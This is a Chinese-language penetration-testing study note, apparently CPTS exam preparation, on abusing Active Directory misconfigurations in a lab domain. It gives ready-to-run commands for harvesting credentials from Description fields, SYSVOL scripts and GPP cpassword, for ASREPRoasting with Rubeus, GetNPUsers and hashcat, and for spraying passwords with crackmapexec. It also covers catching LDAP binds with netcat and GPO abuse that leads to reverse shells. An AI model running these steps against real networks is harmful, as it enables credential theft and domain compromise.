# 第 78 章 - GPO 與信任關係濫用

## 標籤

- #cpts
- #chapter
- #active-directory
- #gpo
- #exchange
- #asreproasting
- #misconfig

## 學習目標

- 理解 Exchange Windows Permissions 群組的危險性，及其對 DCSync 的路徑。
- 理解 PrivExchange 與印表機漏洞（MS-RPRN）的利用原理。
- 用 adidnsdump 列舉 AD DNS 中隱藏的主機紀錄。
- 用 PowerView 找出 Description 欄位密碼、PASSWD_NOTREQD 帳號、GPP 密碼（cpassword）。
- 列舉並執行 ASREPRoasting（Rubeus、GetNPUsers.py、Hashcat 模式 18200）。
- 用 PowerView 列舉 GPO 及其 ACL，找出可寫的 GPO。

---

## 一、Exchange 相關群組濫用

### 理論

```text
Exchange Windows Permissions 群組
  → 非受保護群組（AdminSDHolder 不保護它）
  → 成員被賦予對網域物件寫入 DACL 的能力
  → 攻擊路徑：加入此群組 → WriteDacl on Domain → 賦予 DCSync 權限
  → 常見成員：Account Operators 群組成員、進階使用者、遠端辦公支援人員

Organization Management 群組
  → Exchange 等效的「網域管理員」
  → 對所有網域使用者的信箱有完整存取權
  → 對 Microsoft Exchange Security Groups OU 擁有完全控制
  → 該 OU 包含 Exchange Windows Permissions 群組
  → 入侵 Exchange 伺服器 → 通常直接導致 DA 權限
  → Exchange 伺服器記憶體中可能有數百個明文憑證（OWA 快取）

列舉 Exchange 相關群組成員：
  → 參考 ACL 濫用章節（WriteDacl → DCSync）
  → GitHub: Exchange-AD-Privesc 詳細技術文件
```

```powershell
# 列舉 Exchange Windows Permissions 群組成員
Get-DomainGroupMember -Identity "Exchange Windows Permissions" | Select MemberName

# 列舉 Organization Management 群組成員
Get-DomainGroupMember -Identity "Organization Management" | Select MemberName

# 確認 Exchange Windows Permissions 對網域的 DACL 權限
Get-DomainObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
  Where-Object {
    $_.SecurityIdentifier -match (Get-DomainGroup "Exchange Windows Permissions").objectsid
  }
# 若看到 WriteDacl → 可賦予任意帳號 DCSync 權限
```

---

## 二、PrivExchange

### 理論

```text
PrivExchange 攻擊原理（2019 年修補前）
  → Exchange PushSubscription 功能漏洞
  → 任何擁有信箱的使用者可強制 Exchange 伺服器向任意主機驗證（HTTP）
  → Exchange 服務以 SYSTEM 執行，且擁有 WriteDacl（2019 CU 前）
  → 攻擊路徑：
      1. 設定中繼伺服器（如 ntlmrelayx）監聽 HTTP
      2. 發送 PushSubscription 請求 → Exchange 主動向我們的主機發起 NTLM 驗證
      3. 中繼至 LDAP → 賦予攻擊帳號 DCSync 權限
      4. 以任何已驗證網域使用者 → 直接取得 DA
  → 若無法中繼至 LDAP → 可中繼至其他網域主機

防禦：安裝 2019 年 Exchange CU 修補程式
```

---

## 三、印表機漏洞（Printer Bug / MS-RPRN）

### 理論

```text
MS-RPRN 協定漏洞（SpoolSample / PrinterBug）
  → Print Spooler 服務以 SYSTEM 執行
  → 任何網域使用者可透過 RpcOpenPrinter + RpcRemoteFindFirstPrinterChangeNotificationEx
    強制目標主機（包含 DC）向我們的主機發起 SMB 驗證
  → 攻擊路徑：
      → 中繼至 LDAP → 賦予 DCSync 權限
      → 中繼至 LDAP → 設定目標主機的 RBCD（Resource-Based Constrained Delegation）
         → 以任意使用者身份在目標主機驗證
      → 跨森林攻擊（若信任允許 TGT 委派）

用途：
  → 已是一個森林的 DA → 利用 Printer Bug 入侵另一個森林的 DC（需無限制委派主機）

工具：Get-SpoolStatus（SecurityAssessment.ps1）
```

```powershell
# 檢查目標是否啟用 Print Spooler（易受攻擊）
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# 輸出：
# ComputerName                        Status
# ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
# Status = True → Print Spooler 服務執行中 → 易受 PrinterBug 攻擊
```

---

## 四、MS14-068（Kerberos PAC 偽造）

### 理論

```text
MS14-068 — Kerberos PAC 偽造漏洞
  → PAC（Privilege Attribute Certificate）：Kerberos 票券中含帳號群組資訊
  → 正常流程：PAC 由 KDC 以秘密金鑰簽署，防止竄改
  → 漏洞：偽造的 PAC 可被 KDC 接受為合法 → 偽造自己是 DA
  → 利用：任何標準網域使用者帳號即可提升至 DA
  → 工具：PyKEK（Python Kerberos Exploitation Kit）、Impacket

防禦：唯一方法是安裝 MS14-068 修補程式
HTB 展示：Mantis 機器（已退役）
```

---

## 五、嗅探 LDAP 憑證

### 理論

```text
LDAP 憑證嗅探
  → 許多應用程式（印表機、Web 管理主控台）使用 LDAP 服務帳號連接 AD
  → 這些憑證儲存在設備 Web 介面中，有時可直接查看（明文）
  → 部分設備有「測試連線」功能 → 可將 LDAP IP 改為攻擊機 IP
  → 在攻擊機 389 port 啟動 netcat 監聽 → 設備發送 LDAP Bind → 憑證明文到達

攻擊前提：
  → 能存取設備的 Web 管理介面（弱密碼 / 預設密碼）
  → 或有 test connection 按鈕且允許修改 LDAP 伺服器 IP

進階版本：使用完整 LDAP 伺服器（如 slapd）回應 Bind 請求，強制降級至明文
```

```bash
# 設定 netcat 監聽 LDAP 埠（攻擊機）
nc -lvnp 389
# 當設備發起測試連線 → 可能收到：
# 0u bindRequest ... bindRequest{version=3, name=ldap.agent, authentication=simple:Sup3rS3cur3P@ss!}
```

---

## 六、列舉 DNS 紀錄（adidnsdump）

### 理論

```text
adidnsdump — AD 整合 DNS 完整列舉工具
  → AD 環境中所有已驗證使用者預設可列出 DNS 區域子物件
  → 直接 LDAP DNS 查詢不會返回所有紀錄（有過濾）
  → adidnsdump 解析整個區域 → 發現隱藏主機

輸出：records.csv
  → 欄位：type, name, value
  → 未知紀錄顯示為 ?,NAME,?

-r 旗標：對未知紀錄執行反向 DNS 查詢 → 解析隱藏 IP
  → LOGISTICS → 172.16.5.240（可能是重要目標）

用途：
  → 發現 BloodHound/Nmap 掃描未列出的主機
  → 找出命名慣例（如 SRV01934 → 真實服務名稱）
```

```bash
# 執行 adidnsdump（第一次，不解析未知紀錄）
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
# 輸入密碼
# 輸出：Found 27 records → 部分顯示為 ?,LOGISTICS,?

# 查看初始結果
head records.csv
# type,name,value
# ?,LOGISTICS,?         ← 未知，待解析
# A,ForestDnsZones,172.16.5.5

# 第二次，加 -r 解析未知紀錄
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
# 再次查看
head records.csv
# type,name,value
# A,LOGISTICS,172.16.5.240  ← 已解析 → 發現隱藏主機
```

---

## 七、其他常見不當設定

### 7.1 Description 欄位密碼

```text
AD 使用者帳號的 Description / Notes 欄位
  → 管理員有時將密碼存放於此（如舊版系統整合帳號）
  → 所有已驗證使用者可讀 → 高風險
  → 發現後立即嘗試橫向移動（密碼可能是預設值並多處重用）
```

```powershell
# 列舉所有有 Description 欄位的使用者帳號
Get-DomainUser * |
  Select-Object samaccountname, description |
  Where-Object { $_.Description -ne $null }

# 輸出範例：
# samaccountname  description
# ldap.agent      *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
#                                                   ↑ 明文密碼！
```

### 7.2 PASSWD_NOTREQD 帳號

```text
userAccountControl 旗標 PASSWD_NOTREQD（UF_PASSWD_NOTREQD）
  → 設定後：帳號不受密碼長度原則限制
  → 密碼可能為空（但不保證）→ 需逐一測試
  → 常見成因：
      → 供應商安裝後未移除旗標
      → 管理員建立帳號時不小心未設密碼
  → 列舉後嘗試空密碼登入，或將其列入報告
```

```powershell
# 列舉設有 PASSWD_NOTREQD 旗標的帳號
Get-DomainUser -UACFilter PASSWD_NOTREQD |
  Select-Object samaccountname, useraccountcontrol

# 輸出欄位：
# samaccountname  useraccountcontrol
# mlowe           PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
# nagiosagent     PASSWD_NOTREQD, NORMAL_ACCOUNT

# 後續：嘗試以這些帳號空密碼登入
crackmapexec smb 172.16.5.5 -u mlowe -p '' --local-auth
```

### 7.3 SYSVOL 指令碼中的憑證

```text
SYSVOL 共用（\\DC\SYSVOL\DOMAIN\scripts）
  → 所有已驗證使用者可讀
  → 常見敏感檔案：.bat / .vbs / .ps1 指令碼
  → 可能包含：本機 Admin 密碼、服務帳號密碼、連線字串

發現密碼後：
  → CrackMapExec --local-auth 驗證密碼是否在其他主機有效
  → 嘗試密碼噴灑（密碼重用）
```

```powershell
# 列舉 SYSVOL scripts 目錄內容
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
# 尋找 .vbs / .ps1 / .bat 等指令碼

# 查看指令碼內容（發現密碼）
cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs
# sUser = "Administrator"
# sPwd = "!ILFREIGHT_L0cALADmin!"  ← 本機管理員密碼！
```

```bash
# Linux 端驗證密碼（本機帳號噴灑）
crackmapexec smb 172.16.5.5 -u Administrator -p '!ILFREIGHT_L0cALADmin!' --local-auth
```

### 7.4 GPP 密碼（Group Policy Preferences）

```text
GPP 密碼（cpassword）
  → 建立 GPP 時，SYSVOL 產生 .xml 設定檔（drives.xml, groups.xml 等）
  → 這些 xml 可能含 cpassword 屬性（AES-256 加密）
  → 問題：微軟公開了 AES 金鑰（MSDN）→ 任何人可解密
  → MS14-025 只阻止新建，不刪除舊有 XML
  → 所有網域已驗證使用者可讀 SYSVOL → 任何人可解密
  → 常見儲存位置：Groups.xml, Services.xml, Scheduledtasks.xml

自動登入（GPP Autologin）：
  → Registry.xml 中可能有自動登入帳號明文密碼
  → 未被 MS14-025 禁止 → 仍有效
```

```bash
# 手動解密 cpassword（gpp-decrypt）
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
# 輸出：Password1

# CrackMapExec 自動找 GPP 密碼
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_password

# CrackMapExec 找自動登入（Registry.xml）
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
# 輸出：
# Usernames: ['guarddesk']
# Domains:   ['INLANEFREIGHT.LOCAL']
# Passwords: ['ILFreightguardadmin!']   ← 明文密碼！
```

```powershell
# PowerSploit 自動找 GPP 密碼（Windows 端）
Get-GPPPassword
# 或
Get-GPPAutologon
```

---

## 八、ASREPRoasting

### 理論

```text
ASREPRoasting — 針對不需 Kerberos 預先驗證的帳號

Kerberos 預先驗證流程：
  → 正常：使用者用密碼加密時間戳 → 送給 DC → DC 解密驗證 → 發放 TGT
  → 停用預驗：任何人可不驗證身份 → 直接請求 AS-REP（含 TGT）
  → AS-REP 用帳號密碼加密 → 可離線破解

所需條件：
  → userAccountControl 包含 DONT_REQ_PREAUTH（UAC 旗標 4194304）
  → 不需 SPN（不同於 Kerberoasting）

攻擊者角色：
  → GenericWrite / GenericAll → 可啟用此旗標 → 取得 AS-REP → 破解 → 恢復密碼 → 再關閉旗標
  → 或直接列舉現有 DONT_REQ_PREAUTH 帳號

Hashcat 模式：18200（Kerberos 5, etype 23, AS-REP）
```

```powershell
# 列舉 DONT_REQ_PREAUTH 帳號（PowerView）
Get-DomainUser -PreauthNotRequired |
  Select-Object samaccountname, userprincipalname, useraccountcontrol | fl

# 輸出：
# samaccountname     : mmorgan
# useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH

# Rubeus 擷取 AS-REP 雜湊（Windows 端）
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
# /user     → 指定目標帳號
# /nowrap   → 不換行（讓 Hashcat 可直接使用）
# /format:hashcat → 輸出格式 $krb5asrep$23$...
```

```bash
# Linux 端 — GetNPUsers.py（Impacket）
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
# -no-pass     → 不使用密碼（對 DONT_REQ_PREAUTH 帳號有效）
# -usersfile   → 提供使用者清單（kerbrute 或 LDAP 列舉所得）
# 有效且停用預驗的帳號 → 自動回傳 AS-REP 雜湊

# Kerbrute 列舉使用者時自動擷取 AS-REP
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
# 若發現 mmorgan has no pre auth required → 自動輸出 $krb5asrep$23$mmorgan@...

# Hashcat 離線破解（模式 18200）
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
# 破解成功輸出：
# $krb5asrep$23$mmorgan@...:Welcome!00
#                             ↑ 帳號明文密碼
```

---

## 九、GPO 列舉與濫用

### 理論

```text
GPO（Group Policy Object）濫用
  → GPO 對 OU 套用設定 → 影響 OU 內所有使用者和電腦
  → 若對 GPO 有寫入權限（WriteProperty / WriteDacl / GenericAll）：
      → 新增 SeDebugPrivilege / SeImpersonatePrivilege 等特權
      → 新增本機管理員使用者
      → 建立排程工作（反向 shell）
      → 設定惡意電腦啟動腳本

列舉工具：
  → PowerView Get-DomainGPO → 取得 GPO 名稱
  → Get-GPO（RSAT 內建 cmdlet）→ 相同功能
  → BloodHound → 視覺化 GPO 套用範圍與 ACL
  → 進階審計：group3r、ADRecon、PingCastle

利用工具：SharpGPOAbuse
  → 注意：GPO 套用整個 OU → 影響 OU 內所有電腦
  → 指定 -UserAccount / -ComputerName 縮小範圍

GPO 名稱提供的資訊：
  → Deny Control Panel Access / Deny CMD Access → 存在限制
  → AutoLogon / GuardAutoLogon → 可能有 GPP 密碼
  → Certificate Services → AD CS 已部署
  → Service Accounts Password Policy → 服務帳號有獨立密碼原則
```

```powershell
# 列舉所有 GPO 名稱（PowerView）
Get-DomainGPO | Select-Object displayname

# 列舉所有 GPO 名稱（RSAT Get-GPO）
Get-GPO -All | Select-Object DisplayName

# 找出 Domain Users 對 GPO 的 ACL
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl |
  Where-Object { $_.SecurityIdentifier -eq $sid }

# 輸出欄位判讀：
# ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty,
#                         Delete, GenericExecute, WriteDacl, WriteOwner
# 有 WriteProperty / WriteDacl → 可取得對此 GPO 的完全控制

# 將 GPO GUID 轉換為名稱
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
# DisplayName: Disconnect Idle RDP
# → Domain Users 對「中斷閒置 RDP」GPO 有寫入權 → 可植入惡意設定
```

---

## 判斷邏輯

```
進入 AD 環境後 → 雜項不當設定系統性列舉
│
├── Exchange 相關
│   ├── 列舉 Exchange Windows Permissions 群組成員
│   ├── 成員 → WriteDacl on Domain → 可賦予 DCSync
│   └── Organization Management → 全信箱存取 / Exchange Security Groups 完全控制
│
├── 敏感憑證挖掘
│   ├── Description 欄位 → Get-DomainUser * | Select samaccountname,description | ? Description -ne $null
│   ├── SYSVOL 指令碼 → ls \\DC\SYSVOL\DOMAIN\scripts → cat *.vbs/*.ps1
│   └── GPP 密碼 → crackmapexec -M gpp_password / gpp_autologin
│
├── 帳號旗標異常
│   └── PASSWD_NOTREQD → Get-DomainUser -UACFilter PASSWD_NOTREQD → 測試空密碼
│
├── DNS 隱藏主機
│   └── adidnsdump -u DOMAIN\\user ldap://DC_IP (-r 解析未知)
│
├── ASREPRoasting
│   ├── 列舉 → Get-DomainUser -PreauthNotRequired
│   ├── Windows → Rubeus asreproast /user /nowrap /format:hashcat
│   ├── Linux → GetNPUsers.py DOMAIN/ -dc-ip DC_IP -no-pass -usersfile users
│   └── 破解 → hashcat -m 18200 hash rockyou.txt
│
└── GPO 濫用
    ├── 列舉 GPO → Get-DomainGPO | Select displayname
    ├── 找可寫 GPO → Convert-NameToSid "Domain Users" → Get-DomainGPO | Get-ObjectAcl | ? SID -eq $sid
    ├── 有 WriteProperty / WriteDacl → SharpGPOAbuse
    │   ├── 新增本機管理員
    │   ├── 建立排程工作（反向 shell）
    │   └── 注意：影響整個 OU → 指定 -ComputerName/-UserAccount 縮範圍
    └── GUID → Get-GPO -Guid GUID → 確認 DisplayName 與影響範圍
```

---

## 速查表

```powershell
# Exchange 群組成員
Get-DomainGroupMember -Identity "Exchange Windows Permissions" | Select MemberName

# Description 欄位密碼
Get-DomainUser * | Select samaccountname,description | Where-Object { $_.Description -ne $null }

# PASSWD_NOTREQD 帳號
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select samaccountname,useraccountcontrol

# SYSVOL 指令碼目錄
ls \\DC\SYSVOL\DOMAIN\scripts

# GPP 密碼（PowerSploit）
Get-GPPPassword

# ASREPRoasting — 列舉
Get-DomainUser -PreauthNotRequired | Select samaccountname,userprincipalname

# ASREPRoasting — Rubeus
.\Rubeus.exe asreproast /user:TARGET /nowrap /format:hashcat

# GPO 名稱列舉
Get-DomainGPO | Select displayname

# GPO ACL — Domain Users 可寫
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | Where-Object { $_.SecurityIdentifier -eq $sid }

# GPO GUID → 名稱
Get-GPO -Guid GUID_HERE
```

```bash
# adidnsdump
adidnsdump -u DOMAIN\\USER ldap://DC_IP
adidnsdump -u DOMAIN\\USER ldap://DC_IP -r   # 解析未知紀錄

# GPP 密碼（CrackMapExec）
crackmapexec smb DC_IP -u USER -p PASS -M gpp_password
crackmapexec smb DC_IP -u USER -p PASS -M gpp_autologin

# gpp-decrypt
gpp-decrypt CPASSWORD_VALUE

# ASREPRoasting — GetNPUsers.py
GetNPUsers.py DOMAIN/ -dc-ip DC_IP -no-pass -usersfile valid_users

# Hashcat ASREPRoast
hashcat -m 18200 as_rep_hashes /usr/share/wordlists/rockyou.txt
```

---

## 關聯筆記

- [[77-ADACL濫用|第 77 章 - AD ACL 濫用]]（Exchange WriteDacl → DCSync）
- [[77A-DCSync|第 77A 章 - DCSync 攻擊]]
- [[75-Kerberos攻擊|第 75 章 - Kerberos 攻擊]]（Kerberoasting 比較）
- [[79-ADCS|第 79 章 - ADCS]]
- [[09-Volume-9-Active-Directory-Index|Vol.9 - Active Directory]]
